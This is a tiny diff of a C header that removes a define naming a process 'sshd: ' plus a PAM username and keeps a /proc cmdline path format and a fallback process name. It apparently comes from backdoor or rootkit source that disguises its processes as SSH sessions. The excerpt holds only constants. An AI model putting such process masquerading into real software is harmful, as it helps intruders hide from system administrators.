@@ -1,5 +1,3 @@
-#define BD_SSHPROCNAME "sshd: "PAM_UNAME
-
 #define CMDLINE_PATH      "/proc/%d/cmdline"
 #define FALLBACK_PROCNAME "YuuUUU"
 #define NAME_MAXLEN       64
